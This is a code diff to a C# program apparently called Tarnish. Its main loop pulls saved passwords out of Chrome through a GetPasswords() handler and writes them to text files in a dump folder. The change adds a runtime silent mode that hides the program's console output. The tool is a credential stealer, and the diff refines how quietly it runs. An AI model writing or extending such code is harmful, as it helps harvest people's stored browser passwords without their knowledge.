@@ -10,34 +10,37 @@ namespace Tarnish
         { 
             new ProcChrome()
         };
-        [STAThread]
         static void Main(string[] args)
         {
-            if (!Directory.Exists(Global.dumpDir))
-                Directory.CreateDirectory(Global.dumpDir);
+            if (!Directory.Exists(Global.DumpDir))
+                Directory.CreateDirectory(Global.DumpDir);
+            if (!Config.Silent)
+            {
+                Console.WriteLine("Tarnish " + Global.AssemName.Version.ToString());
+            }
             foreach (Proc proc in Processes)
             {
+                if (!Config.Silent)
+                {
+                    Console.WriteLine(proc.Name);
+                    Console.ForegroundColor = ConsoleColor.Gray;
+                }
                 string pws = proc.GetPasswords();
-                #if !SILENT
-                Console.ForegroundColor = ConsoleColor.Gray;
-                Console.Write(proc.Name + "  ");
-                #endif
                 if (pws != "")
                 {
-                    using (StreamWriter sw = new StreamWriter(Global.dumpDir + proc.Name + ".txt"))
+                    using (StreamWriter sw = new StreamWriter(Global.DumpDir + proc.Name + ".txt"))
                         sw.Write(pws);
-                    #if !SILENT
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("OKAY!");
-                    #endif
+                    if (!Config.Silent)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine("OKAY!");
+                    }
                 }
-                #if !SILENT
-                else
+                else if (!Config.Silent)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("FAIL!");
                 }
-                #endif
             }
         }
     }
